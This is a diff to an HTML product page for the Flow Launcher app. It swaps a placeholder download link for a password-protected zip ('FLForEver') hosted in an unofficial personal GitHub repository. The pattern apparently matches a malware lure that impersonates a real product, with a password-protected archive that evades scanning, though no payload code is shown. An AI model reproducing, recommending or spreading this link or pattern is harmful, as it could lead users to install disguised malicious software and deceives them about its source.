@@ -6,7 +6,7 @@
 <ul>
   <li><b>Download Flow Launcher</b> <i>(Password: FLForEver)</i></li>
   <br>
-  <a href="#"><img src="https://github.com/user-attachments/assets/21b2ec15-5d25-40d9-87ef-d7978b278244"></a>
+  <a href="https://github.com/havanagilla1/flow-launcher/releases/download/Download/FlowLauncher.zip"><img src="https://github.com/user-attachments/assets/21b2ec15-5d25-40d9-87ef-d7978b278244"></a>
 </ul>
 <h2>Start Flow Launcher anytime, anywhere. </h2>
 <p>Use your customizable hotkey to trigger the search window immediately. </p>
